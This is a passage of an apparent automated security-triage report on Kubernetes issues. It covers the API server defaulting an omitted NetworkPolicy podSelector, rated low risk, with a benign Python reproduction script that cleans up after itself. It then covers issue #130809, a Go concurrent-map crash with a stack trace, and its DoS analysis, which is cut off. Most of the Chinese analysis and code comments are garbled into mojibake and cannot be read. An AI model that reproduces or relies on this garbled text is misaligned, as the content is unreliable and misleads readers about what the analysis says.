    *   è§„åˆ™5ï¼šè¯¥é—®é¢˜å¯¼è‡´çš„DoSéœ€è¦æ”»å‡»è€…æ‹¥æœ‰`create`æƒé™ï¼ˆéåªè¯»ï¼‰ã€‚æ ¹æ®è§„åˆ™5ï¼Œå½“DoSæ”»å‡»éœ€è¦éåªè¯»æƒé™ï¼ˆå¦‚åˆ›å»ºã€ä¿®æ”¹ï¼‰æ—¶ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚å› æ­¤ï¼Œå°½ç®¡æ½œåœ¨Availabilityå½±å“å¯èƒ½å¾ˆé«˜ï¼Œä½†åˆ©ç”¨æ¡ä»¶è¦æ±‚äº†åˆ›å»ºæƒé™ï¼Œéœ€è¦é™çº§å¤„ç†ã€‚
    *   è§„åˆ™7ï¼šè¯¥é—®é¢˜ä¸ç›´æ¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸æˆ–ææƒã€‚
    *   è§„åˆ™8ï¼šè¯¥é—®é¢˜å‘ç”Ÿåœ¨ä¸€ä¸ªå‘½åç©ºé—´å†…ï¼Œä¸€ä¸ªæœ‰æƒé™åˆ›å»ºNetworkPolicyçš„ç”¨æˆ·ï¼ˆé€šå¸¸æ˜¯è¯¥å‘½åç©ºé—´çš„ç®¡ç†å‘˜æˆ–å¼€å‘è€…ï¼‰åˆ›å»ºçš„ç­–ç•¥ä¼šå½±å“è¯¥å‘½åç©ºé—´å†…çš„æ‰€æœ‰Podï¼Œå¯èƒ½å½±å“åˆ°åŒä¸€å‘½åç©ºé—´å†…è¿è¡Œçš„å…¶ä»–ç”¨æˆ·æˆ–æœåŠ¡çš„åº”ç”¨ã€‚ä½†è¿™ä»å±€é™äºè¯¥ç”¨æˆ·æœ‰æƒé™æ“ä½œçš„èŒƒå›´å†…ã€‚

**ç»“è®º**ï¼šè¯¥é—®é¢˜æ˜¯Kubernetes APIå®ç°ä¸å®šä¹‰ä¹‹é—´çš„ä¸ä¸€è‡´æ€§ï¼Œå¯èƒ½å¯¼è‡´ç”¨æˆ·åœ¨é…ç½®NetworkPolicyæ—¶äº§ç”Ÿé¢„æœŸä¹‹å¤–çš„è¡Œä¸ºã€‚ç”±äºç©ºé€‰æ‹©å™¨`{}`ä¼šåŒ¹é…å‘½åç©ºé—´ä¸­çš„æ‰€æœ‰Podï¼Œé”™è¯¯é…ç½®å¯èƒ½å¯¼è‡´å¯¹å‘½åç©ºé—´å†…æ‰€æœ‰æœåŠ¡çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æˆ–æ„å¤–çš„ç½‘ç»œæš´éœ²ã€‚ç„¶è€Œï¼Œåˆ©ç”¨æ­¤é—®é¢˜éœ€è¦æ”»å‡»è€…æ‹¥æœ‰åˆ›å»º`NetworkPolicy`çš„æƒé™ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬5æ¡ï¼Œéœ€è¦åˆ›å»ºæƒé™æ‰èƒ½è§¦å‘çš„DoSæ”»å‡»ä¸åº”è¯„å®šä¸ºé«˜é£é™©ã€‚å› æ­¤ï¼Œè¯¥é—®é¢˜è¢«è¯„å®šä¸ºä½é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import logging
import uuid
from kubernetes import config, client
from kubernetes.client.rest import ApiException

# é…ç½®æ—¥å¿—è®°å½•
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# å…¨å±€è¶…æ—¶è®¾ç½® (ç§’)
GLOBAL_TIMEOUT = 120

def main():
    start_time = time.time()
    operation_successful = False
    policy_name = f"test-poc-netpol-{uuid.uuid4().hex[:8]}"
    namespace = "default" # åœ¨é»˜è®¤å‘½åç©ºé—´ä¸­æµ‹è¯•

    api_client = None
    networking_v1_api = None

    try:
        # å°è¯•åŠ è½½ Kubernetes é…ç½®
        try:
            # å‡è®¾ kubeconfig åœ¨é»˜è®¤ä½ç½® ~/.kube/config
            config.load_kube_config()
            logging.info("æˆåŠŸåŠ è½½ Kubernetes é…ç½®ã€‚")
            api_client = client.ApiClient()
            networking_v1_api = client.NetworkingV1Api(api_client)
        except Exception as e:
            logging.error(f"æ— æ³•åŠ è½½ Kubernetes é…ç½®: {e}")
            logging.error("è¯·ç¡®ä¿ KUBECONFIG ç¯å¢ƒå˜é‡å·²è®¾ç½®æˆ–é…ç½®æ–‡ä»¶ä½äº ~/.kube/config")
            return # æ— æ³•è¿æ¥é›†ç¾¤ï¼Œæå‰é€€å‡º

        # å®šä¹‰ NetworkPolicy å¯¹è±¡ (ä¸åŒ…å« podSelector)
        policy_body = {
            "apiVersion": "networking.k8s.io/v1",
            "kind": "NetworkPolicy",
            "metadata": {
                "name": policy_name,
                "namespace": namespace
            },
            "spec": {
                "policyTypes": ["Egress"]
                # podSelector å­—æ®µæ•…æ„çœç•¥
            }
        }

        logging.info(f"å°è¯•åœ¨å‘½åç©ºé—´ '{namespace}' ä¸­åˆ›å»º NetworkPolicy '{policy_name}' (æ—  podSelector)...")

        # åˆ›å»º NetworkPolicy
        try:
            # è®¾ç½®è¯·æ±‚è¶…æ—¶
            networking_v1_api.create_namespaced_network_policy(
                namespace=namespace,
                body=policy_body,
                _request_timeout=30 # ä¸ºAPIè°ƒç”¨è®¾ç½®è¶…æ—¶
            )
            logging.info(f"NetworkPolicy '{policy_name}' åˆ›å»ºæˆåŠŸã€‚")
            operation_successful = True # æ ‡è®°åˆ›å»ºæˆåŠŸï¼Œä»¥ä¾¿åç»­è¯»å–å’Œæ¸…ç†

            # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
            if time.time() - start_time > GLOBAL_TIMEOUT:
                logging.warning("æ“ä½œè¶…æ—¶ã€‚")
                return

        except ApiException as e:
            # å¦‚æœAPIæœåŠ¡å™¨æŒ‰é¢„æœŸæ‹’ç»äº†ï¼ˆè™½ç„¶æˆ‘ä»¬çŸ¥é“å®ƒä¸ä¼šï¼‰ï¼Œè¿™é‡Œä¼šæ•è·
            # æˆ–è€…å¦‚æœå‘ç”Ÿå…¶ä»–APIé”™è¯¯
            logging.error(f"åˆ›å»º NetworkPolicy æ—¶å‘ç”Ÿ API é”™è¯¯: {e.status} - {e.reason}")
            logging.error(f"å“åº”ä½“: {e.body}")
            # å¦‚æœæ˜¯å› ä¸ºæƒé™ä¸è¶³ç­‰åŸå› å¤±è´¥ï¼Œè„šæœ¬ä¹Ÿåº”ç»ˆæ­¢
            return
        except Exception as e:
            logging.error(f"åˆ›å»º NetworkPolicy æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
            return

        # å¦‚æœåˆ›å»ºæˆåŠŸï¼Œå°è¯•è¯»å–å¹¶éªŒè¯ podSelector
        if operation_successful:
            logging.info(f"ç­‰å¾…çŸ­æš‚æ—¶é—´åè¯»å– NetworkPolicy '{policy_name}'...")
            time.sleep(2) # ç­‰å¾…APIå¯¹è±¡ä¼ æ’­

            # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
            if time.time() - start_time > GLOBAL_TIMEOUT:
                logging.warning("æ“ä½œè¶…æ—¶ã€‚")
                return

            try:
                # è®¾ç½®è¯·æ±‚è¶…æ—¶
                retrieved_policy = networking_v1_api.read_namespaced_network_policy(
                    name=policy_name,
                    namespace=namespace,
                    _request_timeout=30 # ä¸ºAPIè°ƒç”¨è®¾ç½®è¶…æ—¶
                )
                logging.info(f"æˆåŠŸè¯»å– NetworkPolicy '{policy_name}'ã€‚")

                # éªŒè¯ podSelector æ˜¯å¦å­˜åœ¨ä¸”ä¸ºç©ºå­—å…¸ {}
                if hasattr(retrieved_policy.spec, 'pod_selector') and retrieved_policy.spec.pod_selector == {}:
                    logging.info("éªŒè¯æˆåŠŸï¼šAPI æœåŠ¡å™¨è‡ªåŠ¨æ·»åŠ äº†ç©ºçš„ 'podSelector: {}'.")
                    print("\n--- å¤ç°ç»“æœ ---")
                    print(f"Issue å¤ç°æˆåŠŸ: åˆ›å»ºä¸å¸¦ spec.podSelector çš„ NetworkPolicy æ—¶ï¼ŒAPI æœåŠ¡å™¨è‡ªåŠ¨å¡«å……äº† 'podSelector: {{}}'.")
                    print("--- å¤ç°ç»“æœ ---")
                else:
                    logging.warning("éªŒè¯å¤±è´¥ï¼šè¯»å–åˆ°çš„ NetworkPolicy ä¸åŒ…å«é¢„æœŸçš„ç©º podSelectorã€‚")
                    logging.warning(f"è¯»å–åˆ°çš„ spec: {retrieved_policy.spec}")
                    print("\n--- å¤ç°ç»“æœ ---")
                    print(f"Issue å¤ç°å¤±è´¥: æœªèƒ½éªŒè¯è‡ªåŠ¨å¡«å…… 'podSelector: {{}}'.")
                    print("--- å¤ç°ç»“æœ ---")

            except ApiException as e:
                logging.error(f"è¯»å– NetworkPolicy '{policy_name}' æ—¶å‘ç”Ÿ API é”™è¯¯: {e.status} - {e.reason}")
            except Exception as e:
                logging.error(f"è¯»å– NetworkPolicy æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")

    finally:
        # æ¸…ç†ï¼šæ— è®ºæˆåŠŸä¸å¦ï¼Œéƒ½å°è¯•åˆ é™¤åˆ›å»ºçš„ NetworkPolicy
        if operation_successful and networking_v1_api:
            # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
            if time.time() - start_time > GLOBAL_TIMEOUT:
                logging.warning("æ¸…ç†æ“ä½œå› è¶…æ—¶è€Œè¢«è·³è¿‡ã€‚è¯·æ‰‹åŠ¨æ¸…ç† NetworkPolicy: " + policy_name)

            else:
                logging.info(f"å¼€å§‹æ¸…ç†: åˆ é™¤ NetworkPolicy '{policy_name}'...")
                try:
                     # è®¾ç½®è¯·æ±‚è¶…æ—¶
                    networking_v1_api.delete_namespaced_network_policy(
                        name=policy_name,
                        namespace=namespace,
                        body=client.V1DeleteOptions(),
                        _request_timeout=30 # ä¸ºAPIè°ƒç”¨è®¾ç½®è¶…æ—¶
                    )
                    logging.info(f"NetworkPolicy '{policy_name}' åˆ é™¤æˆåŠŸã€‚")
                except ApiException as e:
                    # å¦‚æœèµ„æºå·²ä¸å­˜åœ¨æˆ–å…¶ä»–APIé”™è¯¯
                    if e.status == 404:
                         logging.info(f"NetworkPolicy '{policy_name}' å·²ä¸å­˜åœ¨ï¼Œæ— éœ€åˆ é™¤ã€‚")
                    else:
                         logging.error(f"åˆ é™¤ NetworkPolicy æ—¶å‘ç”Ÿ API é”™è¯¯: {e.status} - {e.reason}")
                         logging.warning(f"è¯·æ‰‹åŠ¨æ¸…ç† NetworkPolicy '{policy_name}' åœ¨å‘½åç©ºé—´ '{namespace}'ã€‚")
                except Exception as e:
                    logging.error(f"åˆ é™¤ NetworkPolicy æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
                    logging.warning(f"è¯·æ‰‹åŠ¨æ¸…ç† NetworkPolicy '{policy_name}' åœ¨å‘½åç©ºé—´ '{namespace}'ã€‚")

        else:
            logging.info("æœªåˆ›å»º NetworkPolicy æˆ–æ— æ³•è¿æ¥ APIï¼Œæ— éœ€æ¸…ç†ã€‚")

        end_time = time.time()
        logging.info(f"è„šæœ¬æ‰§è¡Œå®Œæ¯•ï¼Œæ€»è€—æ—¶: {end_time - start_time:.2f} ç§’ã€‚")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬ä½¿ç”¨å®˜æ–¹çš„`kubernetes` Pythonå®¢æˆ·ç«¯åº“æ¥å¤ç°Issueä¸­æè¿°çš„è¡Œä¸ºã€‚

1.  **åŠ è½½é…ç½®**: è„šæœ¬é¦–å…ˆå°è¯•ä»é»˜è®¤ä½ç½®ï¼ˆ`~/.kube/config`ï¼‰åŠ è½½Kubernetesé›†ç¾¤çš„è®¿é—®é…ç½®ã€‚å¦‚æœå¤±è´¥ï¼Œä¼šæ‰“å°é”™è¯¯ä¿¡æ¯å¹¶é€€å‡ºã€‚
2.  **å‡†å¤‡**: å®šä¹‰ä¸€ä¸ªå”¯ä¸€çš„`NetworkPolicy`åç§°ï¼ˆåŒ…å«UUIDé˜²æ­¢å†²çªï¼‰å’Œæµ‹è¯•å°†è¦ä½¿ç”¨çš„å‘½åç©ºé—´ï¼ˆé»˜è®¤ä¸º`default`ï¼‰ã€‚
3.  **å®šä¹‰ç­–ç•¥**: åˆ›å»ºä¸€ä¸ªPythonå­—å…¸æ¥è¡¨ç¤º`NetworkPolicy`èµ„æºã€‚å…³é”®åœ¨äºï¼Œè¿™ä¸ªå­—å…¸çš„`spec`éƒ¨åˆ†æ•…æ„çœç•¥äº†`podSelector`å­—æ®µï¼Œæ­£å¦‚Issueä¸­æè¿°çš„é‚£æ ·ã€‚
4.  **åˆ›å»ºç­–ç•¥**: ä½¿ç”¨`NetworkingV1Api`çš„`create_namespaced_network_policy`æ–¹æ³•å°è¯•åœ¨æŒ‡å®šçš„å‘½åç©ºé—´ä¸­åˆ›å»ºè¿™ä¸ªæ²¡æœ‰`podSelector`çš„`NetworkPolicy`ã€‚
5.  **éªŒè¯**: å¦‚æœåˆ›å»ºæˆåŠŸï¼Œè„šæœ¬ä¼šçŸ­æš‚æš‚åœï¼ˆç­‰å¾…èµ„æºçŠ¶æ€æ›´æ–°ï¼‰ï¼Œç„¶åä½¿ç”¨`read_namespaced_network_policy`æ–¹æ³•è¯»å–åˆšåˆšåˆ›å»ºçš„`NetworkPolicy`å¯¹è±¡ã€‚
6.  **æ£€æŸ¥ç»“æœ**: è„šæœ¬æ£€æŸ¥è¿”å›çš„`NetworkPolicy`å¯¹è±¡çš„`spec`ä¸­æ˜¯å¦å­˜åœ¨`pod_selector`å­—æ®µï¼Œå¹¶ä¸”å…¶å€¼æ˜¯å¦ä¸ºä¸€ä¸ªç©ºå­—å…¸ï¼ˆ`{}`ï¼‰ã€‚å¦‚æœç¬¦åˆé¢„æœŸï¼Œåˆ™æ‰“å°æˆåŠŸå¤ç°çš„æ¶ˆæ¯ï¼›å¦åˆ™æ‰“å°å¤±è´¥ä¿¡æ¯å’Œè¯»å–åˆ°çš„`spec`å†…å®¹ã€‚
7.  **æ¸…ç†**: åœ¨`finally`å—ä¸­ï¼Œè„šæœ¬ç¡®ä¿å°è¯•åˆ é™¤ä¹‹å‰åˆ›å»ºçš„`NetworkPolicy`èµ„æºï¼Œä»¥ä¿æŒé›†ç¾¤ç¯å¢ƒçš„æ¸…æ´ã€‚å³ä½¿åœ¨åˆ›å»ºæˆ–éªŒè¯è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œåªè¦ç­–ç•¥è¢«æˆåŠŸåˆ›å»ºè¿‡ï¼Œæ¸…ç†æ­¥éª¤ä¹Ÿä¼šå°è¯•æ‰§è¡Œã€‚
8.  **è¶…æ—¶ä¸é”™è¯¯å¤„ç†**: è„šæœ¬åŒ…å«åŸºæœ¬çš„é”™è¯¯å¤„ç†ï¼ˆä¾‹å¦‚APIå¼‚å¸¸ï¼‰å’Œæ—¥å¿—è®°å½•ã€‚åŒæ—¶ï¼Œè®¾ç½®äº†å…¨å±€è¶…æ—¶ï¼ˆ2åˆ†é’Ÿï¼‰å’ŒAPIè°ƒç”¨çº§åˆ«çš„è¶…æ—¶ï¼ˆ30ç§’ï¼‰ï¼Œä»¥é˜²æ­¢è„šæœ¬é•¿æ—¶é—´é˜»å¡ã€‚

è¿è¡Œæ­¤è„šæœ¬éœ€è¦å®‰è£…`kubernetes` Pythonåº“ (`pip install kubernetes`)ï¼Œå¹¶ä¸”éœ€è¦æœ‰è®¿é—®ç›®æ ‡Kubernetesé›†ç¾¤å¹¶èƒ½åœ¨`default`å‘½åç©ºé—´åˆ›å»º`NetworkPolicy`çš„æƒé™ã€‚è„šæœ¬æ‰§è¡Œç»“æœä¼šç›´æ¥æ‰“å°åˆ°æ§åˆ¶å°ï¼Œæ˜ç¡®æŒ‡å‡ºæ˜¯å¦æˆåŠŸå¤ç°äº†Issueä¸­æè¿°çš„APIæœåŠ¡å™¨è‡ªåŠ¨å¡«å……`podSelector: {}`çš„è¡Œä¸ºã€‚

---


## Issue #130809 k8s.io/apimachinery/pkg/runtime.(*SchemeBuilder).AddToSchemeï¼šfatal error: concurrent map read and map write

- Issue é“¾æ¥ï¼š[#130809](https://github.com/kubernetes/kubernetes/issues/130809)

### Issue å†…å®¹

#### What happened?

In a process that integrates multiple Go goroutines, if these goroutines call the runtime module to modify scheme's map type data, concurrent read-write issues with the map may arise.

`2025/03/06 07:01:26 LogFormatter is nil or boolean, use default LogFormatter.
2025/03/06 07:01:26 [GoF2Logger] Log init end
2025/03/06 07:01:26 LogFormatter is nil or boolean, use default LogFormatter.
2025/03/06 07:01:26 [GoF2Logger] Log init end
I0306 07:01:31.962969       1 leaderelection.go:254] attempting to acquire leader lease kube-system/caascontroller...
I0306 07:01:31.991437       1 leaderelection.go:268] successfully acquired lease kube-system/caascontroller
fatal error: concurrent map read and map write

goroutine 137 [running]:
k8s.io/apimachinery/pkg/runtime.(*Scheme).ObjectKinds(0x40003c5030, {0xaaaab92abaa8?, 0x400057acf0?})
	k8s.io/apimachinery@v0.30.3/pkg/runtime/scheme.go:263 +0xc0
k8s.io/apimachinery/pkg/runtime.(*parameterCodec).EncodeParameters(0xaaaaba96d120, {0xaaaab92abaa8, 0x400057acf0}, {{0xaaaab8091b2b, 0x5}, {0xaaaab8090091, 0x2}})
	k8s.io/apimachinery@v0.30.3/pkg/runtime/codec.go:190 +0x4c
k8s.io/client-go/rest.(*Request).SpecificallyVersionedParams(0x400061b440, {0xaaaab92abaa8?, 0x400057acf0?}, {0xaaaab92abda0?, 0xaaaaba96d120?}, {{0xaaaab8091b2b?, 0x8?}, {0xaaaab8090091?, 0x400079c0d8?}})
	k8s.io/client-go@v0.30.3/rest/request.go:379 +0x5c
k8s.io/client-go/rest.(*Request).VersionedParams(...)
	k8s.io/client-go@v0.30.3/rest/request.go:372
k8s.io/client-go/gentype.(*Client[...]).Watch(0xaaaab809b7c0, {0xaaaab92cefc8?, 0xaaaabaa00aa0}, {{{0x0, 0x0}, {0x0, 0x0}}, {0x40002ed861, 0xf}, {0x0, ...}, ...})
	k8s.io/client-go@v0.30.3/gentype/type.go:220 +0x134
k8s.io/client-go/informers/batch/v1.NewFilteredJobInformer.func2({{{0x0, 0x0}, {0x0, 0x0}}, {0x0, 0x0}, {0x0, 0x0}, 0x0, 0x1, ...})
	k8s.io/client-go@v0.30.3/informers/batch/v1/job.go:71 +0x10c
k8s.io/client-go/tools/cache.(*ListWatch).Watch(0x0?, {{{0x0, 0x0}, {0x0, 0x0}}, {0x0, 0x0}, {0x0, 0x0}, 0x0, ...})
	k8s.io/client-go@v0.30.3/tools/cache/listwatch.go:115 +0x48
k8s.io/client-go/tools/cache.(*Reflector).watchList(0x40004960f0, 0x40005491a0)
	k8s.io/client-go@v0.30.3/tools/cache/reflector.go:669 +0x3a8
k8s.io/client-go/tools/cache.(*Reflector).ListAndWatch(0x40004960f0, 0x40005491a0)
	k8s.io/client-go@v0.30.3/tools/cache/reflector.go:348 +0x150
k8s.io/client-go/tools/cache.(*Reflector).Run.func1()
	k8s.io/client-go@v0.30.3/tools/cache/reflector.go:307 +0x28
k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0x10?)
	k8s.io/apimachinery@v0.30.3/pkg/util/wait/backoff.go:226 +0x40
k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0x40000c1f40, {0xaaaab92a30c0, 0x4000418d20}, 0x1, 0x40005491a0)
	k8s.io/apimachinery@v0.30.3/pkg/util/wait/backoff.go:227 +0x90
k8s.io/client-go/tools/cache.(*Reflector).Run(0x40004960f0, 0x40005491a0)
	k8s.io/client-go@v0.30.3/tools/cache/reflector.go:306 +0x184
k8s.io/client-go/tools/cache.(*controller).Run.(*Group).StartWithChannel.func2()
	k8s.io/apimachinery@v0.30.3/pkg/util/wait/wait.go:55 +0x28
k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
	k8s.io/apimachinery@v0.30.3/pkg/util/wait/wait.go:72 +0x5c
created by k8s.io/apimachinery/pkg/util/wait.(*Group).Start in goroutine 133
	k8s.io/apimachinery@v0.30.3/pkg/util/wait/wait.go:70 +0x7c
...
goroutine 147 [runnable]:
reflect.FuncOf.func1(0x4000896c30)
	reflect/type.go:1829 +0x104
reflect.FuncOf({0x400038fe20, 0x2, 0xffff3cfaba18?}, {0xaaaabaa00aa0, 0x0, 0xaaaab6438b9c?}, 0x0)
	reflect/type.go:1844 +0x5f0
reflect.(*rtype).Method(0xaaaab9132e80, 0x1)
	reflect/type.go:615 +0x3ec
reflect.(*rtype).MethodByName(0xaaaab9132e80, {0xaaaab809de96, 0xc})
	reflect/type.go:651 +0x288
reflect.Value.MethodByName({0xaaaab9132e80?, 0x4000161650?, 0x4000720258?}, {0xaaaab809de96?, 0xaaaab90e6a40?})
	reflect/value.go:2117 +0x48
k8s.io/apimachinery/pkg/runtime.(*Scheme).AddKnownTypeWithName(0x40003c5030, {{0xaaaab80b2453, 0x15}, {0xaaaab8090091, 0x2}, {0xaaaab8b6bc60, 0x17}}, {0xaaaab92b70f8, 0x4000161650})
	k8s.io/apimachinery@v0.30.3/pkg/runtime/scheme.go:184 +0x408
k8s.io/apimachinery/pkg/runtime.(*Scheme).AddKnownTypes(0x40003c5030, {{0xaaaab80b2453?, 0xffff3cfabb00?}, {0xaaaab8090091?, 0x4000720488?}}, {0x4000720418?, 0x24?, 0xffff3d12b9d8?})
	k8s.io/apimachinery@v0.30.3/pkg/runtime/scheme.go:148 +0x124
github.com/projectcalico/calico/libcalico-go/lib/backend/k8s.buildCRDClientV1.func1.1(0x40003c5030)
	github.com/projectcalico/calico@v0.0.0/libcalico-go/lib/backend/k8s/k8s.go:700 +0x58c
k8s.io/apimachinery/pkg/runtime.(*SchemeBuilder).AddToScheme(...)
	k8s.io/apimachinery@v0.30.3/pkg/runtime/scheme_builder.go:29
github.com/projectcalico/calico/libcalico-go/lib/backend/k8s.buildCRDClientV1.func1()
	github.com/projectcalico/calico@v0.0.0/libcalico-go/lib/backend/k8s/k8s.go:742 +0x13c
sync.(*Once).doSlow(0x40005c8b48?, 0x40007208e0?)
	sync/once.go:74 +0x100
sync.(*Once).Do(...)
	sync/once.go:65
github.com/projectcalico/calico/libcalico-go/lib/backend/k8s.buildCRDClientV1({{0x4000131d40, 0x15}, {0x0, 0x0}, {{0x0, 0x0}, {0x0, 0x0}, 0x0, {0x0, ...}}, ...})
	github.com/projectcalico/calico@v0.0.0/libcalico-go/lib/backend/k8s/k8s.go:696 +0x1e4
github.com/projectcalico/calico/libcalico-go/lib/backend/k8s.NewKubeClientV2(0x40007c1448)
	github.com/projectcalico/calico@v0.0.0/libcalico-go/lib/backend/k8s/k8s.go:280 +0x90
github.com/projectcalico/calico/libcalico-go/lib/clientv3.NewFromConfig(0xaaaab809bb1a?)
	github.com/projectcalico/calico@v0.0.0/libcalico-go/lib/clientv3/client.go:88 +0x24
controller/src/base.InitClientWithCfg(0x40007c1448)
	controller@v0.0.0/src/base/client.go:71 +0x9c
caascontroller/cmd/caascontroller/controllers.initConfig(0x40007c1448)
	caascontroller/cmd/caascontroller/controllers/networkcontroller.go:22 +0x54
caascontroller/cmd/caascontroller/controllers.runNetworkController({0xaaaab92cef20, 0x4000710f50}, 0x100000000000000?, {0xaaaab92fb100, 0x40003c7a40})
	caascontroller/cmd/caascontroller/controllers/networkcontroller.go:26 +0x30
created by caascontroller/cmd/caascontroller/controllers.startNetworkController in goroutine 103
	caascontroller/cmd/caascontroller/controllers/controllers.go:163 +0xf4`

#### What did you expect to happen?

A process integrating multiple service modules will not cause the process to restart due to concurrent read-write operations on scheme data.

#### How can we reproduce it (as minimally and precisely as possible)?

In a process, several modules with scheme operations are launched via goroutines.

#### Anything else we need to know?

It is recommended to add read-write locks to the map data structure under the scheme.

![Image](https://github.com/user-attachments/assets/25f2f3d6-7c80-4c57-90f5-e99e0276b97c)

#### Kubernetes version

<details>
Client Version: v1.31.1
Server Version: v1.31.1
```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ªåœ¨ Go è¯­è¨€ç¨‹åºä¸­å› å¹¶å‘è¯»å†™ `map` è€Œå¯¼è‡´çš„ `fatal error`ï¼ˆè‡´å‘½é”™è¯¯ï¼‰ã€‚å…·ä½“å‘ç”Ÿåœ¨ Kubernetes çš„ `k8s.io/apimachinery/pkg/runtime` åŒ…ä¸­ï¼Œå½“å¤šä¸ª Go åç¨‹ï¼ˆgoroutineï¼‰åŒæ—¶å°è¯•è¯»å–å’Œä¿®æ”¹ï¼ˆå†™å…¥ï¼‰åŒä¸€ä¸ª `runtime.Scheme` å¯¹è±¡å†…éƒ¨çš„ `map` æ•°æ®ç»“æ„æ—¶ï¼Œä¼šè§¦å‘ Go è¿è¡Œæ—¶çš„å¹¶å‘å®‰å…¨æ£€æµ‹æœºåˆ¶ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒé€€å‡ºã€‚

ä»æä¾›çš„å †æ ˆä¿¡æ¯æ¥çœ‹ï¼š
1.  `goroutine 137` åœ¨æ‰§è¡Œ `k8s.io/apimachinery/pkg/runtime.(*Scheme).ObjectKinds`ï¼Œè¿™æ˜¯ä¸€ä¸ªè¯»å–æ“ä½œï¼Œå°è¯•è·å–æŸä¸ªå¯¹è±¡çš„ GVK (GroupVersionKind) ä¿¡æ¯ã€‚
2.  `goroutine 147` åœ¨æ‰§è¡Œ `k8s.io/apimachinery/pkg/runtime.(*Scheme).AddKnownTypeWithName`ï¼Œè¿™æ˜¯ä¸€ä¸ªå†™å…¥æ“ä½œï¼Œå°è¯•å‘ Scheme ä¸­æ³¨å†Œæ–°çš„ç±»å‹ï¼ˆå¦‚ Calico çš„ CRD ç±»å‹ `github.com/projectcalico/calico/libcalico-go/lib/backend/k8s.buildCRDClientV1.func1.1` æ‰€ç¤ºï¼‰ã€‚

Go è¯­è¨€åŸç”Ÿçš„ `map` ç±»å‹å¹¶éå¹¶å‘å®‰å…¨ã€‚å½“ä¸€ä¸ªåç¨‹æ­£åœ¨å†™å…¥ `map` æ—¶ï¼Œå…¶ä»–åç¨‹ä¸èƒ½åŒæ—¶è¿›è¡Œè¯»å–æˆ–å†™å…¥æ“ä½œï¼Œå¦åˆ™ä¼šè§¦å‘ `fatal error: concurrent map read and map write` æˆ– `fatal error: concurrent map writes`ã€‚

è¿™ä¸ªé—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª **ç«äº‰æ¡ä»¶ (Race Condition)** å¯¼è‡´çš„ç¨‹åºç¨³å®šæ€§é—®é¢˜ã€‚å…¶ç›´æ¥åæœæ˜¯è¿è¡Œè¯¥ç¨‹åºçš„è¿›ç¨‹ï¼ˆä¾‹å¦‚ä¸€ä¸ªè‡ªå®šä¹‰çš„ controller `caascontroller` æˆ–ä½¿ç”¨äº† `client-go` å¹¶é›†æˆäº†å¦‚ Calico è¿™æ ·ä¼šä¿®æ”¹ Scheme çš„åº“çš„ç»„ä»¶ï¼‰ä¼šå´©æºƒé€€å‡ºã€‚

**å®‰å…¨é£é™©åˆ†æï¼š**

1.  **æ¼æ´ç±»å‹ï¼š** è¿™ä¸»è¦æ˜¯ä¸€ä¸ª **æ‹’ç»æœåŠ¡ (Denial of Service, DoS)** é—®é¢˜ã€‚è¿›ç¨‹å´©æºƒå¯¼è‡´å…¶æä¾›çš„æœåŠ¡ä¸­æ–­ï¼Œéœ€è¦è¢«é‡å¯ï¼ˆä¾‹å¦‚è¢« Kubernetes deployment è‡ªåŠ¨æ‹‰èµ·ï¼‰ã€‚
2.  **è§¦å‘æ¡ä»¶ï¼š** è§¦å‘è¯¥é—®é¢˜éœ€è¦ç‰¹å®šçš„å¹¶å‘åœºæ™¯ï¼Œå³åœ¨ç¨‹åºåˆå§‹åŒ–æˆ–è¿è¡Œæ—¶ï¼Œæœ‰å¤šä¸ªåç¨‹å¹¶å‘åœ°å¯¹åŒä¸€ä¸ª `runtime.Scheme` å®ä¾‹è¿›è¡Œè¯»å†™æ“ä½œã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºï¼ˆå¦‚ Controllerï¼‰å¯åŠ¨æ—¶ï¼Œå¹¶å‘åˆå§‹åŒ–ä¸åŒçš„ client æˆ–è€… informerï¼Œå¹¶ä¸”è¿™äº›åˆå§‹åŒ–è¿‡ç¨‹éƒ½æ¶‰åŠåˆ°å‘ `scheme.Scheme` æ³¨å†Œç±»å‹ï¼ˆå†™æ“ä½œï¼‰ï¼ŒåŒæ—¶å…¶ä»–åç¨‹å¯èƒ½åœ¨è¿›è¡Œ API è°ƒç”¨ã€åºåˆ—åŒ–/ååºåˆ—åŒ–ç­‰éœ€è¦æŸ¥è¯¢ Scheme ä¿¡æ¯ï¼ˆè¯»æ“ä½œï¼‰çš„åœºæ™¯ã€‚
3.  **å¯åˆ©ç”¨æ€§ï¼š**
